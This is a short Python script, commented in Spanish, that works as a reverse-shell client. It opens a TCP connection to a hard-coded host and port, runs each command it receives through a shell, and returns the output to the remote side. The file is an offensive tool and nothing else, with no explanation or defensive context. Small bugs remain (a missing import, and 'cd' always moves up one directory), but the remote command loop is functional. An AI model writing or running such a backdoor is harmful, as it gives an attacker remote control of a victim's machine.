import socket
import subprocess
import os

def main():
	target = "192.168.1.71" # IP
	port = 7040 #puerto del servidor
	conexion = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	conexion.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	conexion.connect((target,port))
	print("Se establecio la conexion")

	while True:
		command = conexion.recv(1024) 
		command = command.decode('latin1')
		if command == 'exit':
			conexion.close()
			break

		elif command[:2] == 'cd':
			os.chdir('..')
			conexion.send(b'Ok')

		else:
			proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			output = proc.stdout.read()+proc.stderr.read()
			conexion.send(output)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()
	
